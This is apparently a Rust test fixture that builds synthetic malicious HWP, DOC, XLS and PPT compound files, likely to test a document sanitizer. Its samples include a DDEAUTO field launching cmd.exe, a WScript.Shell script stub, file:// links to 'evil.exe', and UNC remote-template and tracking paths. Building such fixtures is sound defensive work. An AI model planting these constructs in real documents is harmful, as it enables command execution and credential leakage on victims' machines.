//! 레거시 OLE 복합 파일(HWP/DOC/XLS/PPT) 합성 샘플.
#![allow(dead_code)]

use std::io::{Cursor, Read, Write};

pub fn cfb(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut c = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
    for (path, data) in entries {
        let p = format!("/{path}");
        if let Some(parent) = std::path::Path::new(&p).parent() {
            c.create_storage_all(parent).unwrap();
        }
        c.create_stream(&p).unwrap().write_all(data).unwrap();
    }
    c.flush().unwrap();
    c.into_inner().into_inner()
}

pub fn read_cfb(data: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut c = cfb::CompoundFile::open(Cursor::new(data)).unwrap();
    let paths: Vec<String> = c
        .walk()
        .filter(|e| e.is_stream())
        .map(|e| {
            e.path()
                .to_string_lossy()
                .trim_start_matches('/')
                .to_string()
        })
        .collect();
    paths
        .into_iter()
        .map(|p| {
            let mut buf = Vec::new();
            c.open_stream(format!("/{p}"))
                .unwrap()
                .read_to_end(&mut buf)
                .unwrap();
            (p, buf)
        })
        .collect()
}

pub fn stream<'a>(streams: &'a [(String, Vec<u8>)], name: &str) -> Option<&'a [u8]> {
    streams
        .iter()
        .find(|(n, _)| n == name)
        .map(|(_, d)| d.as_slice())
}

fn deflate(data: &[u8]) -> Vec<u8> {
    let mut e = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
    e.write_all(data).unwrap();
    e.finish().unwrap()
}

pub fn inflate(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    flate2::read::DeflateDecoder::new(data)
        .read_to_end(&mut out)
        .unwrap();
    out
}

pub fn utf16(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(u16::to_le_bytes).collect()
}

// ------------------------------------------------------------------------- HWP 5
fn hwp_record(tag: u16, level: u16, data: &[u8]) -> Vec<u8> {
    let mut out = ((tag as u32) | ((level as u32) << 10) | ((data.len() as u32) << 20))
        .to_le_bytes()
        .to_vec();
    out.extend_from_slice(data);
    out
}

fn wstr(s: &str) -> Vec<u8> {
    let mut v = (s.encode_utf16().count() as u16).to_le_bytes().to_vec();
    v.extend(utf16(s));
    v
}

fn hyperlink_ctrl(command: &str) -> Vec<u8> {
    let mut d = b"klh%".to_vec();
    d.extend_from_slice(&[0; 4]); // 속성
    d.push(0); // 기타 속성
    d.extend(wstr(command));
    d.extend_from_slice(&7u32.to_le_bytes()); // 고유 ID
    hwp_record(16 + 55, 1, &d)
}

pub fn malicious_hwp(props: u32) -> Vec<u8> {
    let mut header = b"HWP Document File".to_vec();
    header.resize(32, 0);
    header.extend_from_slice(&[0, 3, 0, 5]);
    header.extend_from_slice(&props.to_le_bytes());
    header.resize(256, 0);

    let mut docinfo = Vec::new();
    let mut link = 0u16.to_le_bytes().to_vec();
    link.extend(wstr("\\\\10.0.0.1\\share\\track.png"));
    link.extend(wstr("track.png"));
    docinfo.extend(hwp_record(18, 0, &link));
    let mut emb = 1u16.to_le_bytes().to_vec();
    emb.extend_from_slice(&1u16.to_le_bytes());
    emb.extend(wstr("png"));
    docinfo.extend(hwp_record(18, 0, &emb));

    let mut body = hwp_record(66, 0, &[0; 22]);
    body.extend(hwp_record(67, 1, &utf16("안전한 본문")));
    body.extend(hyperlink_ctrl("file\\://attacker/share/evil.exe;1;0;0;"));
    body.extend(hyperlink_ctrl("https\\://example.com/;1;0;0;"));
    body.extend(hyperlink_ctrl("www.daum.net|-"));

    let mut script = (40u32).to_le_bytes().to_vec();
    script.extend(utf16("new ActiveXObject('WScript.Shell').Run();"));
    let script = &script[..4 + 80];

    let png = crate::common::png_with_payload();
    let compressed = props & 1 != 0;
    let c = |d: &[u8]| if compressed { deflate(d) } else { d.to_vec() };
    cfb(&[
        ("FileHeader", &header),
        ("DocInfo", &c(&docinfo)),
        ("BodyText/Section0", &c(&body)),
        ("BinData/BIN0001.png", &deflate(&png)),
        (
            "BinData/BIN0002.eps",
            &deflate(b"%!PS-Adobe-3.0 EPSF-3.0\n/exploit { } def"),
        ),
        (
            "BinData/BIN0003.OLE",
            &deflate(b"\x00\x00\x00\x00\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1rest"),
        ),
        ("Scripts/DefaultJScript", &c(script)),
        ("Scripts/JScriptVersion", &c(&[1, 0, 0, 0])),
        ("DocOptions/_LinkDoc", b"\\\\evil\\doc.hwp"),
        ("PrvText", &utf16("미리보기\u{7}")),
        ("\u{5}HwpSummaryInformation", b"author"),
    ])
}

// ------------------------------------------------------------------------- DOC
pub const DOC_TEXT: &[u8] =
    b"Hello \x13 DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\" \x14result\x15 \x13 PAGE \x141\x15 \x13 HYPERLINK \\l \"_Toc1\" \x14toc\x15 \x13 HYPERLINK \"file://evil/x\" \x14bad\x15\r";

pub fn malicious_doc(flags: u16) -> Vec<u8> {
    let text_at = 0x400usize;
    let mut word = vec![0u8; text_at + DOC_TEXT.len()];
    word[0..2].copy_from_slice(&0xA5ECu16.to_le_bytes());
    word[2..4].copy_from_slice(&0x00C1u16.to_le_bytes());
    word[0x0A..0x0C].copy_from_slice(&flags.to_le_bytes());
    word[32..34].copy_from_slice(&14u16.to_le_bytes());
    word[62..64].copy_from_slice(&22u16.to_le_bytes());
    word[152..154].copy_from_slice(&93u16.to_le_bytes());
    word[text_at..].copy_from_slice(DOC_TEXT);

    // 테이블 스트림: CLX + SttbfAssoc
    let mut table = vec![2u8];
    table.extend_from_slice(&16u32.to_le_bytes());
    table.extend_from_slice(&0u32.to_le_bytes());
    table.extend_from_slice(&(DOC_TEXT.len() as u32).to_le_bytes());
    table.extend_from_slice(&[0, 0]);
    table.extend_from_slice(&(((text_at * 2) as u32) | 0x4000_0000).to_le_bytes());
    table.extend_from_slice(&[0, 0]);
    let clx_len = table.len();
    let mut sttb = vec![0xFF, 0xFF, 2, 0, 0, 0, 0, 0];
    let tmpl = "\\\\evil\\share\\t.dot";
    sttb.extend_from_slice(&(tmpl.len() as u16).to_le_bytes());
    sttb.extend(utf16(tmpl));
    table.extend_from_slice(&sttb);
    let set = |w: &mut Vec<u8>, i: usize, fc: usize, lcb: usize| {
        let at = 154 + i * 8;
        w[at..at + 4].copy_from_slice(&(fc as u32).to_le_bytes());
        w[at + 4..at + 8].copy_from_slice(&(lcb as u32).to_le_bytes());
    };
    set(&mut word, 33, 0, clx_len);
    set(&mut word, 32, clx_len, sttb.len());
    set(&mut word, 24, 0, 4);

    cfb(&[
        ("WordDocument", &word),
        ("1Table", &table),
        ("0Table", b"stale data from previous save"),
        ("Macros/VBA/dir", b"Attribute VB_Name AutoOpen"),
        ("ObjectPool/_1234/\u{1}Ole10Native", b"MZ payload"),
        ("\u{1}CompObj", b"compobj"),
        ("\u{5}SummaryInformation", b"author"),
    ])
}

// ------------------------------------------------------------------------- XLS
pub fn biff(rt: u16, body: &[u8]) -> Vec<u8> {
    let mut v = rt.to_le_bytes().to_vec();
    v.extend_from_slice(&(body.len() as u16).to_le_bytes());
    v.extend_from_slice(body);
    v
}

pub fn xls(sheet_type: u8, extra: &[Vec<u8>]) -> Vec<u8> {
    let mut wb = biff(
        0x0809,
        &[0x00, 0x06, 0x05, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
    );
    for e in extra {
        wb.extend_from_slice(e);
    }
    let mut bs = vec![0, 0, 0, 0, 0, sheet_type, 6, 0];
    bs.extend_from_slice(b"Sheet1");
    wb.extend(biff(0x0085, &bs));
    wb.extend(biff(0x000A, &[]));
    cfb(&[
        ("Workbook", &wb),
        ("MBD0001A2B3/\u{1}Ole10Native", b"MZ embedded payload"),
        ("_VBA_PROJECT_CUR/VBA/dir", b"vba"),
        ("\u{5}SummaryInformation", b"author"),
    ])
}

pub fn obproj() -> Vec<u8> {
    biff(0x00D3, &[])
}

pub fn filepass() -> Vec<u8> {
    biff(0x002F, &[0, 0, 0, 0, 0, 0])
}

// ------------------------------------------------------------------------- PPT
pub fn ppt_rec(ver: u16, instance: u16, rt: u16, body: &[u8]) -> Vec<u8> {
    let mut v = ((instance << 4) | ver).to_le_bytes().to_vec();
    v.extend_from_slice(&rt.to_le_bytes());
    v.extend_from_slice(&(body.len() as u32).to_le_bytes());
    v.extend_from_slice(body);
    v
}

pub fn interactive(action: u8, link: u32) -> Vec<u8> {
    let mut b = vec![0u8; 16];
    b[4..8].copy_from_slice(&link.to_le_bytes());
    b[8] = action;
    ppt_rec(0, 0, 0x0FF3, &b)
}

pub fn ppt(with_ole: bool) -> Vec<u8> {
    let mut link = ppt_rec(0, 0, 0x0FD3, &5u32.to_le_bytes());
    link.extend(ppt_rec(0, 1, 0x0FBA, &utf16("file://evil/share/x.exe")));
    let mut good = ppt_rec(0, 0, 0x0FD3, &6u32.to_le_bytes());
    good.extend(ppt_rec(0, 1, 0x0FBA, &utf16("https://example.com/")));
    let mut inner = ppt_rec(0xF, 0, 0x0FD7, &link);
    inner.extend(ppt_rec(0xF, 0, 0x0FD7, &good));
    inner.extend(interactive(2, 0)); // 프로그램 실행
    inner.extend(interactive(1, 0)); // 매크로 실행
    inner.extend(interactive(4, 5)); // 위험 링크
    inner.extend(interactive(4, 6)); // 정상 링크
    inner.extend(interactive(3, 0)); // 슬라이드 이동
    let mut doc = ppt_rec(0xF, 0, 0x03E8, &inner);
    if with_ole {
        // 실제와 같은 형태: 원본 크기 + zlib(OLE 복합 파일)
        let payload = vec![b'A'; 4000];
        let storage = cfb(&[
            ("\u{1}Ole10Native", &payload),
            ("Package", b"MZ\x90\x00 payload"),
        ]);
        let mut z = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::none());
        z.write_all(&storage).unwrap();
        let mut body = (storage.len() as u32).to_le_bytes().to_vec();
        body.extend(z.finish().unwrap());
        doc.extend(ppt_rec(0, 1, 0x1011, &body));
    }
    cfb(&[
        ("PowerPoint Document", &doc),
        ("Current User", &[0u8; 28]),
        ("Pictures", b"pics"),
    ])
}

/// 그림 저장소(FBSE)와 Pictures 스트림(PNG + 메타파일)을 가진 PPT
pub fn ppt_with_pictures() -> Vec<u8> {
    let mut png = Vec::new();
    image::RgbImage::from_pixel(4, 4, image::Rgb([10, 200, 30]))
        .write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png)
        .unwrap();
    let mut body = vec![0u8; 17];
    body.extend(&png);
    let png_rec = ppt_rec(0, 0x6E0, 0xF01E, &body);
    let meta_rec = ppt_rec(0, 0x216, 0xF01B, &[0x11; 40]);
    let fbse = |size: usize, fo: usize| {
        let mut b = vec![6u8, 6];
        b.extend([0u8; 18]);
        b.extend((size as u32).to_le_bytes());
        b.extend(1u32.to_le_bytes());
        b.extend((fo as u32).to_le_bytes());
        b.extend([0u8; 4]);
        ppt_rec(2, 6, 0xF007, &b)
    };
    let mut store = fbse(png_rec.len(), 0);
    store.extend(fbse(meta_rec.len(), png_rec.len()));
    let dgg = ppt_rec(0xF, 0, 0xF000, &ppt_rec(0xF, 2, 0xF001, &store));
    let doc = ppt_rec(0xF, 0, 0x03E8, &ppt_rec(0xF, 0, 0x040B, &dgg));
    let mut pictures = png_rec;
    pictures.extend(meta_rec);
    cfb(&[
        ("PowerPoint Document", &doc),
        ("Current User", &[0u8; 28]),
        ("Pictures", &pictures),
    ])
}

/// 그리기 그룹 레코드에 PNG 그림을 가진 XLS
pub fn xls_with_picture() -> Vec<u8> {
    let mut png = Vec::new();
    image::RgbImage::from_pixel(6, 5, image::Rgb([200, 10, 90]))
        .write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png)
        .unwrap();
    let mut body = vec![0u8; 17];
    body.extend(&png);
    xls(0, &[biff(0x00EB, &ppt_rec(0, 0x6E0, 0xF01E, &body))])
}
